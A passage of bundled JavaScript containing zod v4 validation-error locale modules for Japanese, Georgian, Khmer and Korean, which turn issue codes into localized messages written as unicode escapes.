        if (issue3.values.length === 1)
          return `\u7121\u52B9\u306A\u5165\u529B: ${stringifyPrimitive2(issue3.values[0])}\u304C\u671F\u5F85\u3055\u308C\u307E\u3057\u305F`;
        return `\u7121\u52B9\u306A\u9078\u629E: ${joinValues2(issue3.values, "\u3001")}\u306E\u3044\u305A\u308C\u304B\u3067\u3042\u308B\u5FC5\u8981\u304C\u3042\u308A\u307E\u3059`;
      case "too_big": {
        const adj = issue3.inclusive ? "\u4EE5\u4E0B\u3067\u3042\u308B" : "\u3088\u308A\u5C0F\u3055\u3044";
        const sizing = getSizing(issue3.origin);
        if (sizing)
          return `\u5927\u304D\u3059\u304E\u308B\u5024: ${issue3.origin ?? "\u5024"}\u306F${issue3.maximum.toString()}${sizing.unit ?? "\u8981\u7D20"}${adj}\u5FC5\u8981\u304C\u3042\u308A\u307E\u3059`;
        return `\u5927\u304D\u3059\u304E\u308B\u5024: ${issue3.origin ?? "\u5024"}\u306F${issue3.maximum.toString()}${adj}\u5FC5\u8981\u304C\u3042\u308A\u307E\u3059`;
      }
      case "too_small": {
        const adj = issue3.inclusive ? "\u4EE5\u4E0A\u3067\u3042\u308B" : "\u3088\u308A\u5927\u304D\u3044";
        const sizing = getSizing(issue3.origin);
        if (sizing)
          return `\u5C0F\u3055\u3059\u304E\u308B\u5024: ${issue3.origin}\u306F${issue3.minimum.toString()}${sizing.unit}${adj}\u5FC5\u8981\u304C\u3042\u308A\u307E\u3059`;
        return `\u5C0F\u3055\u3059\u304E\u308B\u5024: ${issue3.origin}\u306F${issue3.minimum.toString()}${adj}\u5FC5\u8981\u304C\u3042\u308A\u307E\u3059`;
      }
      case "invalid_format": {
        const _issue = issue3;
        if (_issue.format === "starts_with")
          return `\u7121\u52B9\u306A\u6587\u5B57\u5217: "${_issue.prefix}"\u3067\u59CB\u307E\u308B\u5FC5\u8981\u304C\u3042\u308A\u307E\u3059`;
        if (_issue.format === "ends_with")
          return `\u7121\u52B9\u306A\u6587\u5B57\u5217: "${_issue.suffix}"\u3067\u7D42\u308F\u308B\u5FC5\u8981\u304C\u3042\u308A\u307E\u3059`;
        if (_issue.format === "includes")
          return `\u7121\u52B9\u306A\u6587\u5B57\u5217: "${_issue.includes}"\u3092\u542B\u3080\u5FC5\u8981\u304C\u3042\u308A\u307E\u3059`;
        if (_issue.format === "regex")
          return `\u7121\u52B9\u306A\u6587\u5B57\u5217: \u30D1\u30BF\u30FC\u30F3${_issue.pattern}\u306B\u4E00\u81F4\u3059\u308B\u5FC5\u8981\u304C\u3042\u308A\u307E\u3059`;
        return `\u7121\u52B9\u306A${Nouns[_issue.format] ?? issue3.format}`;
      }
      case "not_multiple_of":
        return `\u7121\u52B9\u306A\u6570\u5024: ${issue3.divisor}\u306E\u500D\u6570\u3067\u3042\u308B\u5FC5\u8981\u304C\u3042\u308A\u307E\u3059`;
      case "unrecognized_keys":
        return `\u8A8D\u8B58\u3055\u308C\u3066\u3044\u306A\u3044\u30AD\u30FC${issue3.keys.length > 1 ? "\u7FA4" : ""}: ${joinValues2(issue3.keys, "\u3001")}`;
      case "invalid_key":
        return `${issue3.origin}\u5185\u306E\u7121\u52B9\u306A\u30AD\u30FC`;
      case "invalid_union":
        return "\u7121\u52B9\u306A\u5165\u529B";
      case "invalid_element":
        return `${issue3.origin}\u5185\u306E\u7121\u52B9\u306A\u5024`;
      default:
        return `\u7121\u52B9\u306A\u5165\u529B`;
    }
  };
};
function ja_default2() {
  return {
    localeError: error67()
  };
}
// node_modules/@opencode-ai/plugin/node_modules/zod/v4/locales/ka.js
var parsedType5 = (data) => {
  const t = typeof data;
  switch (t) {
    case "number": {
      return Number.isNaN(data) ? "NaN" : "\u10E0\u10D8\u10EA\u10EE\u10D5\u10D8";
    }
    case "object": {
      if (Array.isArray(data)) {
        return "\u10DB\u10D0\u10E1\u10D8\u10D5\u10D8";
      }
      if (data === null) {
        return "null";
      }
      if (Object.getPrototypeOf(data) !== Object.prototype && data.constructor) {
        return data.constructor.name;
      }
    }
  }
  const typeMap = {
    string: "\u10E1\u10E2\u10E0\u10D8\u10DC\u10D2\u10D8",
    boolean: "\u10D1\u10E3\u10DA\u10D4\u10D0\u10DC\u10D8",
    undefined: "undefined",
    bigint: "bigint",
    symbol: "symbol",
    function: "\u10E4\u10E3\u10DC\u10E5\u10EA\u10D8\u10D0"
  };
  return typeMap[t] ?? t;
};
var error68 = () => {
  const Sizable = {
    string: { unit: "\u10E1\u10D8\u10DB\u10D1\u10DD\u10DA\u10DD", verb: "\u10E3\u10DC\u10D3\u10D0 \u10E8\u10D4\u10D8\u10EA\u10D0\u10D5\u10D3\u10D4\u10E1" },
    file: { unit: "\u10D1\u10D0\u10D8\u10E2\u10D8", verb: "\u10E3\u10DC\u10D3\u10D0 \u10E8\u10D4\u10D8\u10EA\u10D0\u10D5\u10D3\u10D4\u10E1" },
    array: { unit: "\u10D4\u10DA\u10D4\u10DB\u10D4\u10DC\u10E2\u10D8", verb: "\u10E3\u10DC\u10D3\u10D0 \u10E8\u10D4\u10D8\u10EA\u10D0\u10D5\u10D3\u10D4\u10E1" },
    set: { unit: "\u10D4\u10DA\u10D4\u10DB\u10D4\u10DC\u10E2\u10D8", verb: "\u10E3\u10DC\u10D3\u10D0 \u10E8\u10D4\u10D8\u10EA\u10D0\u10D5\u10D3\u10D4\u10E1" }
  };
  function getSizing(origin) {
    return Sizable[origin] ?? null;
  }
  const Nouns = {
    regex: "\u10E8\u10D4\u10E7\u10D5\u10D0\u10DC\u10D0",
    email: "\u10D4\u10DA-\u10E4\u10DD\u10E1\u10E2\u10D8\u10E1 \u10DB\u10D8\u10E1\u10D0\u10DB\u10D0\u10E0\u10D7\u10D8",
    url: "URL",
    emoji: "\u10D4\u10DB\u10DD\u10EF\u10D8",
    uuid: "UUID",
    uuidv4: "UUIDv4",
    uuidv6: "UUIDv6",
    nanoid: "nanoid",
    guid: "GUID",
    cuid: "cuid",
    cuid2: "cuid2",
    ulid: "ULID",
    xid: "XID",
    ksuid: "KSUID",
    datetime: "\u10D7\u10D0\u10E0\u10D8\u10E6\u10D8-\u10D3\u10E0\u10DD",
    date: "\u10D7\u10D0\u10E0\u10D8\u10E6\u10D8",
    time: "\u10D3\u10E0\u10DD",
    duration: "\u10EE\u10D0\u10DC\u10D2\u10E0\u10EB\u10DA\u10D8\u10D5\u10DD\u10D1\u10D0",
    ipv4: "IPv4 \u10DB\u10D8\u10E1\u10D0\u10DB\u10D0\u10E0\u10D7\u10D8",
    ipv6: "IPv6 \u10DB\u10D8\u10E1\u10D0\u10DB\u10D0\u10E0\u10D7\u10D8",
    cidrv4: "IPv4 \u10D3\u10D8\u10D0\u10DE\u10D0\u10D6\u10DD\u10DC\u10D8",
    cidrv6: "IPv6 \u10D3\u10D8\u10D0\u10DE\u10D0\u10D6\u10DD\u10DC\u10D8",
    base64: "base64-\u10D9\u10DD\u10D3\u10D8\u10E0\u10D4\u10D1\u10E3\u10DA\u10D8 \u10E1\u10E2\u10E0\u10D8\u10DC\u10D2\u10D8",
    base64url: "base64url-\u10D9\u10DD\u10D3\u10D8\u10E0\u10D4\u10D1\u10E3\u10DA\u10D8 \u10E1\u10E2\u10E0\u10D8\u10DC\u10D2\u10D8",
    json_string: "JSON \u10E1\u10E2\u10E0\u10D8\u10DC\u10D2\u10D8",
    e164: "E.164 \u10DC\u10DD\u10DB\u10D4\u10E0\u10D8",
    jwt: "JWT",
    template_literal: "\u10E8\u10D4\u10E7\u10D5\u10D0\u10DC\u10D0"
  };
  return (issue3) => {
    switch (issue3.code) {
      case "invalid_type":
        return `\u10D0\u10E0\u10D0\u10E1\u10EC\u10DD\u10E0\u10D8 \u10E8\u10D4\u10E7\u10D5\u10D0\u10DC\u10D0: \u10DB\u10DD\u10E1\u10D0\u10DA\u10DD\u10D3\u10DC\u10D4\u10DA\u10D8 ${issue3.expected}, \u10DB\u10D8\u10E6\u10D4\u10D1\u10E3\u10DA\u10D8 ${parsedType5(issue3.input)}`;
      case "invalid_value":
        if (issue3.values.length === 1)
          return `\u10D0\u10E0\u10D0\u10E1\u10EC\u10DD\u10E0\u10D8 \u10E8\u10D4\u10E7\u10D5\u10D0\u10DC\u10D0: \u10DB\u10DD\u10E1\u10D0\u10DA\u10DD\u10D3\u10DC\u10D4\u10DA\u10D8 ${stringifyPrimitive2(issue3.values[0])}`;
        return `\u10D0\u10E0\u10D0\u10E1\u10EC\u10DD\u10E0\u10D8 \u10D5\u10D0\u10E0\u10D8\u10D0\u10DC\u10E2\u10D8: \u10DB\u10DD\u10E1\u10D0\u10DA\u10DD\u10D3\u10DC\u10D4\u10DA\u10D8\u10D0 \u10D4\u10E0\u10D7-\u10D4\u10E0\u10D7\u10D8 ${joinValues2(issue3.values, "|")}-\u10D3\u10D0\u10DC`;
      case "too_big": {
        const adj = issue3.inclusive ? "<=" : "<";
        const sizing = getSizing(issue3.origin);
        if (sizing)
          return `\u10D6\u10D4\u10D3\u10DB\u10D4\u10E2\u10D0\u10D3 \u10D3\u10D8\u10D3\u10D8: \u10DB\u10DD\u10E1\u10D0\u10DA\u10DD\u10D3\u10DC\u10D4\u10DA\u10D8 ${issue3.origin ?? "\u10DB\u10DC\u10D8\u10E8\u10D5\u10DC\u10D4\u10DA\u10DD\u10D1\u10D0"} ${sizing.verb} ${adj}${issue3.maximum.toString()} ${sizing.unit}`;
        return `\u10D6\u10D4\u10D3\u10DB\u10D4\u10E2\u10D0\u10D3 \u10D3\u10D8\u10D3\u10D8: \u10DB\u10DD\u10E1\u10D0\u10DA\u10DD\u10D3\u10DC\u10D4\u10DA\u10D8 ${issue3.origin ?? "\u10DB\u10DC\u10D8\u10E8\u10D5\u10DC\u10D4\u10DA\u10DD\u10D1\u10D0"} \u10D8\u10E7\u10DD\u10E1 ${adj}${issue3.maximum.toString()}`;
      }
      case "too_small": {
        const adj = issue3.inclusive ? ">=" : ">";
        const sizing = getSizing(issue3.origin);
        if (sizing) {
          return `\u10D6\u10D4\u10D3\u10DB\u10D4\u10E2\u10D0\u10D3 \u10DE\u10D0\u10E2\u10D0\u10E0\u10D0: \u10DB\u10DD\u10E1\u10D0\u10DA\u10DD\u10D3\u10DC\u10D4\u10DA\u10D8 ${issue3.origin} ${sizing.verb} ${adj}${issue3.minimum.toString()} ${sizing.unit}`;
        }
        return `\u10D6\u10D4\u10D3\u10DB\u10D4\u10E2\u10D0\u10D3 \u10DE\u10D0\u10E2\u10D0\u10E0\u10D0: \u10DB\u10DD\u10E1\u10D0\u10DA\u10DD\u10D3\u10DC\u10D4\u10DA\u10D8 ${issue3.origin} \u10D8\u10E7\u10DD\u10E1 ${adj}${issue3.minimum.toString()}`;
      }
      case "invalid_format": {
        const _issue = issue3;
        if (_issue.format === "starts_with") {
          return `\u10D0\u10E0\u10D0\u10E1\u10EC\u10DD\u10E0\u10D8 \u10E1\u10E2\u10E0\u10D8\u10DC\u10D2\u10D8: \u10E3\u10DC\u10D3\u10D0 \u10D8\u10EC\u10E7\u10D4\u10D1\u10DD\u10D3\u10D4\u10E1 "${_issue.prefix}"-\u10D8\u10D7`;
        }
        if (_issue.format === "ends_with")
          return `\u10D0\u10E0\u10D0\u10E1\u10EC\u10DD\u10E0\u10D8 \u10E1\u10E2\u10E0\u10D8\u10DC\u10D2\u10D8: \u10E3\u10DC\u10D3\u10D0 \u10DB\u10D7\u10D0\u10D5\u10E0\u10D3\u10D4\u10D1\u10DD\u10D3\u10D4\u10E1 "${_issue.suffix}"-\u10D8\u10D7`;
        if (_issue.format === "includes")
          return `\u10D0\u10E0\u10D0\u10E1\u10EC\u10DD\u10E0\u10D8 \u10E1\u10E2\u10E0\u10D8\u10DC\u10D2\u10D8: \u10E3\u10DC\u10D3\u10D0 \u10E8\u10D4\u10D8\u10EA\u10D0\u10D5\u10D3\u10D4\u10E1 "${_issue.includes}"-\u10E1`;
        if (_issue.format === "regex")
          return `\u10D0\u10E0\u10D0\u10E1\u10EC\u10DD\u10E0\u10D8 \u10E1\u10E2\u10E0\u10D8\u10DC\u10D2\u10D8: \u10E3\u10DC\u10D3\u10D0 \u10E8\u10D4\u10D4\u10E1\u10D0\u10D1\u10D0\u10DB\u10D4\u10D1\u10DD\u10D3\u10D4\u10E1 \u10E8\u10D0\u10D1\u10DA\u10DD\u10DC\u10E1 ${_issue.pattern}`;
        return `\u10D0\u10E0\u10D0\u10E1\u10EC\u10DD\u10E0\u10D8 ${Nouns[_issue.format] ?? issue3.format}`;
      }
      case "not_multiple_of":
        return `\u10D0\u10E0\u10D0\u10E1\u10EC\u10DD\u10E0\u10D8 \u10E0\u10D8\u10EA\u10EE\u10D5\u10D8: \u10E3\u10DC\u10D3\u10D0 \u10D8\u10E7\u10DD\u10E1 ${issue3.divisor}-\u10D8\u10E1 \u10EF\u10D4\u10E0\u10D0\u10D3\u10D8`;
      case "unrecognized_keys":
        return `\u10E3\u10EA\u10DC\u10DD\u10D1\u10D8 \u10D2\u10D0\u10E1\u10D0\u10E6\u10D4\u10D1${issue3.keys.length > 1 ? "\u10D4\u10D1\u10D8" : "\u10D8"}: ${joinValues2(issue3.keys, ", ")}`;
      case "invalid_key":
        return `\u10D0\u10E0\u10D0\u10E1\u10EC\u10DD\u10E0\u10D8 \u10D2\u10D0\u10E1\u10D0\u10E6\u10D4\u10D1\u10D8 ${issue3.origin}-\u10E8\u10D8`;
      case "invalid_union":
        return "\u10D0\u10E0\u10D0\u10E1\u10EC\u10DD\u10E0\u10D8 \u10E8\u10D4\u10E7\u10D5\u10D0\u10DC\u10D0";
      case "invalid_element":
        return `\u10D0\u10E0\u10D0\u10E1\u10EC\u10DD\u10E0\u10D8 \u10DB\u10DC\u10D8\u10E8\u10D5\u10DC\u10D4\u10DA\u10DD\u10D1\u10D0 ${issue3.origin}-\u10E8\u10D8`;
      default:
        return `\u10D0\u10E0\u10D0\u10E1\u10EC\u10DD\u10E0\u10D8 \u10E8\u10D4\u10E7\u10D5\u10D0\u10DC\u10D0`;
    }
  };
};
function ka_default2() {
  return {
    localeError: error68()
  };
}
// node_modules/@opencode-ai/plugin/node_modules/zod/v4/locales/km.js
var error69 = () => {
  const Sizable = {
    string: { unit: "\u178F\u17BD\u17A2\u1780\u17D2\u179F\u179A", verb: "\u1782\u17BD\u179A\u1798\u17B6\u1793" },
    file: { unit: "\u1794\u17C3", verb: "\u1782\u17BD\u179A\u1798\u17B6\u1793" },
    array: { unit: "\u1792\u17B6\u178F\u17BB", verb: "\u1782\u17BD\u179A\u1798\u17B6\u1793" },
    set: { unit: "\u1792\u17B6\u178F\u17BB", verb: "\u1782\u17BD\u179A\u1798\u17B6\u1793" }
  };
  function getSizing(origin) {
    return Sizable[origin] ?? null;
  }
  const parsedType6 = (data) => {
    const t = typeof data;
    switch (t) {
      case "number": {
        return Number.isNaN(data) ? "\u1798\u17B7\u1793\u1798\u17C2\u1793\u1787\u17B6\u179B\u17C1\u1781 (NaN)" : "\u179B\u17C1\u1781";
      }
      case "object": {
        if (Array.isArray(data)) {
          return "\u17A2\u17B6\u179A\u17C1 (Array)";
        }
        if (data === null) {
          return "\u1782\u17D2\u1798\u17B6\u1793\u178F\u1798\u17D2\u179B\u17C3 (null)";
        }
        if (Object.getPrototypeOf(data) !== Object.prototype && data.constructor) {
          return data.constructor.name;
        }
      }
    }
    return t;
  };
  const Nouns = {
    regex: "\u1791\u17B7\u1793\u17D2\u1793\u1793\u17D0\u1799\u1794\u1789\u17D2\u1785\u17BC\u179B",
    email: "\u17A2\u17B6\u179F\u1799\u178A\u17D2\u178B\u17B6\u1793\u17A2\u17CA\u17B8\u1798\u17C2\u179B",
    url: "URL",
    emoji: "\u179F\u1789\u17D2\u1789\u17B6\u17A2\u17B6\u179A\u1798\u17D2\u1798\u178E\u17CD",
    uuid: "UUID",
    uuidv4: "UUIDv4",
    uuidv6: "UUIDv6",
    nanoid: "nanoid",
    guid: "GUID",
    cuid: "cuid",
    cuid2: "cuid2",
    ulid: "ULID",
    xid: "XID",
    ksuid: "KSUID",
    datetime: "\u1780\u17B6\u179B\u1794\u179A\u17B7\u1785\u17D2\u1786\u17C1\u1791 \u1793\u17B7\u1784\u1798\u17C9\u17C4\u1784 ISO",
    date: "\u1780\u17B6\u179B\u1794\u179A\u17B7\u1785\u17D2\u1786\u17C1\u1791 ISO",
    time: "\u1798\u17C9\u17C4\u1784 ISO",
    duration: "\u179A\u1799\u17C8\u1796\u17C1\u179B ISO",
    ipv4: "\u17A2\u17B6\u179F\u1799\u178A\u17D2\u178B\u17B6\u1793 IPv4",
    ipv6: "\u17A2\u17B6\u179F\u1799\u178A\u17D2\u178B\u17B6\u1793 IPv6",
    cidrv4: "\u178A\u17C2\u1793\u17A2\u17B6\u179F\u1799\u178A\u17D2\u178B\u17B6\u1793 IPv4",
    cidrv6: "\u178A\u17C2\u1793\u17A2\u17B6\u179F\u1799\u178A\u17D2\u178B\u17B6\u1793 IPv6",
    base64: "\u1781\u17D2\u179F\u17C2\u17A2\u1780\u17D2\u179F\u179A\u17A2\u17CA\u17B7\u1780\u17BC\u178A base64",
    base64url: "\u1781\u17D2\u179F\u17C2\u17A2\u1780\u17D2\u179F\u179A\u17A2\u17CA\u17B7\u1780\u17BC\u178A base64url",
    json_string: "\u1781\u17D2\u179F\u17C2\u17A2\u1780\u17D2\u179F\u179A JSON",
    e164: "\u179B\u17C1\u1781 E.164",
    jwt: "JWT",
    template_literal: "\u1791\u17B7\u1793\u17D2\u1793\u1793\u17D0\u1799\u1794\u1789\u17D2\u1785\u17BC\u179B"
  };
  return (issue3) => {
    switch (issue3.code) {
      case "invalid_type":
        return `\u1791\u17B7\u1793\u17D2\u1793\u1793\u17D0\u1799\u1794\u1789\u17D2\u1785\u17BC\u179B\u1798\u17B7\u1793\u178F\u17D2\u179A\u17B9\u1798\u178F\u17D2\u179A\u17BC\u179C\u17D6 \u178F\u17D2\u179A\u17BC\u179C\u1780\u17B6\u179A ${issue3.expected} \u1794\u17C9\u17BB\u1793\u17D2\u178F\u17C2\u1791\u1791\u17BD\u179B\u1794\u17B6\u1793 ${parsedType6(issue3.input)}`;
      case "invalid_value":
        if (issue3.values.length === 1)
          return `\u1791\u17B7\u1793\u17D2\u1793\u1793\u17D0\u1799\u1794\u1789\u17D2\u1785\u17BC\u179B\u1798\u17B7\u1793\u178F\u17D2\u179A\u17B9\u1798\u178F\u17D2\u179A\u17BC\u179C\u17D6 \u178F\u17D2\u179A\u17BC\u179C\u1780\u17B6\u179A ${stringifyPrimitive2(issue3.values[0])}`;
        return `\u1787\u1798\u17D2\u179A\u17BE\u179F\u1798\u17B7\u1793\u178F\u17D2\u179A\u17B9\u1798\u178F\u17D2\u179A\u17BC\u179C\u17D6 \u178F\u17D2\u179A\u17BC\u179C\u1787\u17B6\u1798\u17BD\u1799\u1780\u17D2\u1793\u17BB\u1784\u1785\u17C6\u178E\u17C4\u1798 ${joinValues2(issue3.values, "|")}`;
      case "too_big": {
        const adj = issue3.inclusive ? "<=" : "<";
        const sizing = getSizing(issue3.origin);
        if (sizing)
          return `\u1792\u17C6\u1796\u17C1\u1780\u17D6 \u178F\u17D2\u179A\u17BC\u179C\u1780\u17B6\u179A ${issue3.origin ?? "\u178F\u1798\u17D2\u179B\u17C3"} ${adj} ${issue3.maximum.toString()} ${sizing.unit ?? "\u1792\u17B6\u178F\u17BB"}`;
        return `\u1792\u17C6\u1796\u17C1\u1780\u17D6 \u178F\u17D2\u179A\u17BC\u179C\u1780\u17B6\u179A ${issue3.origin ?? "\u178F\u1798\u17D2\u179B\u17C3"} ${adj} ${issue3.maximum.toString()}`;
      }
      case "too_small": {
        const adj = issue3.inclusive ? ">=" : ">";
        const sizing = getSizing(issue3.origin);
        if (sizing) {
          return `\u178F\u17BC\u1785\u1796\u17C1\u1780\u17D6 \u178F\u17D2\u179A\u17BC\u179C\u1780\u17B6\u179A ${issue3.origin} ${adj} ${issue3.minimum.toString()} ${sizing.unit}`;
        }
        return `\u178F\u17BC\u1785\u1796\u17C1\u1780\u17D6 \u178F\u17D2\u179A\u17BC\u179C\u1780\u17B6\u179A ${issue3.origin} ${adj} ${issue3.minimum.toString()}`;
      }
      case "invalid_format": {
        const _issue = issue3;
        if (_issue.format === "starts_with") {
          return `\u1781\u17D2\u179F\u17C2\u17A2\u1780\u17D2\u179F\u179A\u1798\u17B7\u1793\u178F\u17D2\u179A\u17B9\u1798\u178F\u17D2\u179A\u17BC\u179C\u17D6 \u178F\u17D2\u179A\u17BC\u179C\u1785\u17B6\u1794\u17CB\u1795\u17D2\u178F\u17BE\u1798\u178A\u17C4\u1799 "${_issue.prefix}"`;
        }
        if (_issue.format === "ends_with")
          return `\u1781\u17D2\u179F\u17C2\u17A2\u1780\u17D2\u179F\u179A\u1798\u17B7\u1793\u178F\u17D2\u179A\u17B9\u1798\u178F\u17D2\u179A\u17BC\u179C\u17D6 \u178F\u17D2\u179A\u17BC\u179C\u1794\u1789\u17D2\u1785\u1794\u17CB\u178A\u17C4\u1799 "${_issue.suffix}"`;
        if (_issue.format === "includes")
          return `\u1781\u17D2\u179F\u17C2\u17A2\u1780\u17D2\u179F\u179A\u1798\u17B7\u1793\u178F\u17D2\u179A\u17B9\u1798\u178F\u17D2\u179A\u17BC\u179C\u17D6 \u178F\u17D2\u179A\u17BC\u179C\u1798\u17B6\u1793 "${_issue.includes}"`;
        if (_issue.format === "regex")
          return `\u1781\u17D2\u179F\u17C2\u17A2\u1780\u17D2\u179F\u179A\u1798\u17B7\u1793\u178F\u17D2\u179A\u17B9\u1798\u178F\u17D2\u179A\u17BC\u179C\u17D6 \u178F\u17D2\u179A\u17BC\u179C\u178F\u17C2\u1795\u17D2\u1782\u17BC\u1795\u17D2\u1782\u1784\u1793\u17B9\u1784\u1791\u1798\u17D2\u179A\u1784\u17CB\u178A\u17C2\u179B\u1794\u17B6\u1793\u1780\u17C6\u178E\u178F\u17CB ${_issue.pattern}`;
        return `\u1798\u17B7\u1793\u178F\u17D2\u179A\u17B9\u1798\u178F\u17D2\u179A\u17BC\u179C\u17D6 ${Nouns[_issue.format] ?? issue3.format}`;
      }
      case "not_multiple_of":
        return `\u179B\u17C1\u1781\u1798\u17B7\u1793\u178F\u17D2\u179A\u17B9\u1798\u178F\u17D2\u179A\u17BC\u179C\u17D6 \u178F\u17D2\u179A\u17BC\u179C\u178F\u17C2\u1787\u17B6\u1796\u17A0\u17BB\u1782\u17BB\u178E\u1793\u17C3 ${issue3.divisor}`;
      case "unrecognized_keys":
        return `\u179A\u1780\u1783\u17BE\u1789\u179F\u17C4\u1798\u17B7\u1793\u179F\u17D2\u1782\u17B6\u179B\u17CB\u17D6 ${joinValues2(issue3.keys, ", ")}`;
      case "invalid_key":
        return `\u179F\u17C4\u1798\u17B7\u1793\u178F\u17D2\u179A\u17B9\u1798\u178F\u17D2\u179A\u17BC\u179C\u1793\u17C5\u1780\u17D2\u1793\u17BB\u1784 ${issue3.origin}`;
      case "invalid_union":
        return `\u1791\u17B7\u1793\u17D2\u1793\u1793\u17D0\u1799\u1798\u17B7\u1793\u178F\u17D2\u179A\u17B9\u1798\u178F\u17D2\u179A\u17BC\u179C`;
      case "invalid_element":
        return `\u1791\u17B7\u1793\u17D2\u1793\u1793\u17D0\u1799\u1798\u17B7\u1793\u178F\u17D2\u179A\u17B9\u1798\u178F\u17D2\u179A\u17BC\u179C\u1793\u17C5\u1780\u17D2\u1793\u17BB\u1784 ${issue3.origin}`;
      default:
        return `\u1791\u17B7\u1793\u17D2\u1793\u1793\u17D0\u1799\u1798\u17B7\u1793\u178F\u17D2\u179A\u17B9\u1798\u178F\u17D2\u179A\u17BC\u179C`;
    }
  };
};
function km_default2() {
  return {
    localeError: error69()
  };
}

// node_modules/@opencode-ai/plugin/node_modules/zod/v4/locales/kh.js
function kh_default2() {
  return km_default2();
}
// node_modules/@opencode-ai/plugin/node_modules/zod/v4/locales/ko.js
var error70 = () => {
  const Sizable = {
    string: { unit: "\uBB38\uC790", verb: "to have" },
    file: { unit: "\uBC14\uC774\uD2B8", verb: "to have" },
    array: { unit: "\uAC1C", verb: "to have" },
    set: { unit: "\uAC1C", verb: "to have" }
  };
  function getSizing(origin) {
    return Sizable[origin] ?? null;
  }
  const parsedType6 = (data) => {
    const t = typeof data;
    switch (t) {
      case "number": {
        return Number.isNaN(data) ? "NaN" : "number";
      }
      case "object": {
        if (Array.isArray(data)) {
          return "array";
        }
        if (data === null) {
          return "null";
        }
        if (Object.getPrototypeOf(data) !== Object.prototype && data.constructor) {
          return data.constructor.name;
        }
      }
    }
    return t;
  };
  const Nouns = {
    regex: "\uC785\uB825",
    email: "\uC774\uBA54\uC77C \uC8FC\uC18C",
    url: "URL",
    emoji: "\uC774\uBAA8\uC9C0",
    uuid: "UUID",
    uuidv4: "UUIDv4",
    uuidv6: "UUIDv6",
    nanoid: "nanoid",
    guid: "GUID",
    cuid: "cuid",
    cuid2: "cuid2",
    ulid: "ULID",
    xid: "XID",
    ksuid: "KSUID",
    datetime: "ISO \uB0A0\uC9DC\uC2DC\uAC04",
    date: "ISO \uB0A0\uC9DC",
    time: "ISO \uC2DC\uAC04",
    duration: "ISO \uAE30\uAC04",
    ipv4: "IPv4 \uC8FC\uC18C",
    ipv6: "IPv6 \uC8FC\uC18C",
    cidrv4: "IPv4 \uBC94\uC704",
    cidrv6: "IPv6 \uBC94\uC704",
    base64: "base64 \uC778\uCF54\uB529 \uBB38\uC790\uC5F4",
    base64url: "base64url \uC778\uCF54\uB529 \uBB38\uC790\uC5F4",
    json_string: "JSON \uBB38\uC790\uC5F4",
    e164: "E.164 \uBC88\uD638",
    jwt: "JWT",
    template_literal: "\uC785\uB825"
  };
  return (issue3) => {
    switch (issue3.code) {
      case "invalid_type":
        return `\uC798\uBABB\uB41C \uC785\uB825: \uC608\uC0C1 \uD0C0\uC785\uC740 ${issue3.expected}, \uBC1B\uC740 \uD0C0\uC785\uC740 ${parsedType6(issue3.input)}\uC785\uB2C8\uB2E4`;
      case "invalid_value":
        if (issue3.values.length === 1)
          return `\uC798\uBABB\uB41C \uC785\uB825: \uAC12\uC740 ${stringifyPrimitive2(issue3.values[0])} \uC774\uC5B4\uC57C \uD569\uB2C8\uB2E4`;
        return `\uC798\uBABB\uB41C \uC635\uC158: ${joinValues2(issue3.values, "\uB610\uB294 ")} \uC911 \uD558\uB098\uC5EC\uC57C \uD569\uB2C8\uB2E4`;
      case "too_big": {
        const adj = issue3.inclusive ? "\uC774\uD558" : "\uBBF8\uB9CC";
        const suffix = adj === "\uBBF8\uB9CC" ? "\uC774\uC5B4\uC57C \uD569\uB2C8\uB2E4" : "\uC5EC\uC57C \uD569\uB2C8\uB2E4";
        const sizing = getSizing(issue3.origin);
        const unit = sizing?.unit ?? "\uC694\uC18C";
        if (sizing)
          return `${issue3.origin ?? "\uAC12"}\uC774 \uB108\uBB34 \uD07D\uB2C8\uB2E4: ${issue3.maximum.toString()}${unit} ${adj}${suffix}`;
        return `${issue3.origin ?? "\uAC12"}\uC774 \uB108\uBB34 \uD07D\uB2C8\uB2E4: ${issue3.maximum.toString()} ${adj}${suffix}`;
      }
      case "too_small": {
        const adj = issue3.inclusive ? "\uC774\uC0C1" : "\uCD08\uACFC";
        const suffix = adj === "\uC774\uC0C1" ? "\uC774\uC5B4\uC57C \uD569\uB2C8\uB2E4" : "\uC5EC\uC57C \uD569\uB2C8\uB2E4";
        const sizing = getSizing(issue3.origin);
        const unit = sizing?.unit ?? "\uC694\uC18C";
        if (sizing) {
          return `${issue3.origin ?? "\uAC12"}\uC774 \uB108\uBB34 \uC791\uC2B5\uB2C8\uB2E4: ${issue3.minimum.toString()}${unit} ${adj}${suffix}`;
        }
        return `${issue3.origin ?? "\uAC12"}\uC774 \uB108\uBB34 \uC791\uC2B5\uB2C8\uB2E4: ${issue3.minimum.toString()} ${adj}${suffix}`;
      }
      case "invalid_format": {
        const _issue = issue3;
        if (_issue.format === "starts_with") {
          return `\uC798\uBABB\uB41C \uBB38\uC790\uC5F4: "${_issue.prefix}"(\uC73C)\uB85C \uC2DC\uC791\uD574\uC57C \uD569\uB2C8\uB2E4`;
        }
        if (_issue.format === "ends_with")
          return `\uC798\uBABB\uB41C \uBB38\uC790\uC5F4: "${_issue.suffix}"(\uC73C)\uB85C \uB05D\uB098\uC57C \uD569\uB2C8\uB2E4`;
        if (_issue.format === "includes")
          return `\uC798\uBABB\uB41C \uBB38\uC790\uC5F4: "${_issue.includes}"\uC744(\uB97C) \uD3EC\uD568\uD574\uC57C \uD569\uB2C8\uB2E4`;
        if (_issue.format === "regex")
          return `\uC798\uBABB\uB41C \uBB38\uC790\uC5F4: \uC815\uADDC\uC2DD ${_issue.pattern} \uD328\uD134\uACFC \uC77C\uCE58\uD574\uC57C \uD569\uB2C8\uB2E4`;
        return `\uC798\uBABB\uB41C ${Nouns[_issue.format] ?? issue3.format}`;
      }
      case "not_multiple_of":
        return `\uC798\uBABB\uB41C \uC22B\uC790: ${issue3.divisor}\uC758 \uBC30\uC218\uC5EC\uC57C \uD569\uB2C8\uB2E4`;
      case "unrecognized_keys":
        return `\uC778\uC2DD\uD560 \uC218 \uC5C6\uB294 \uD0A4: ${joinValues2(issue3.keys, ", ")}`;
      case "invalid_key":
        return `\uC798\uBABB\uB41C \uD0A4: ${issue3.origin}`;
      case "invalid_union":
        return `\uC798\uBABB\uB41C \uC785\uB825`;
      case "invalid_element":
        return `\uC798\uBABB\uB41C \uAC12: ${issue3.origin}`;
      default:
        return `\uC798\uBABB\uB41C \uC785\uB825`;
    }
  };
};
function ko_default2() {
  return {
    localeError: error70()
  };
}
// node_modules/@opencode-ai/plugin/node_modules/zod/v4/locales/lt.js
var parsedType6 = (data) => {
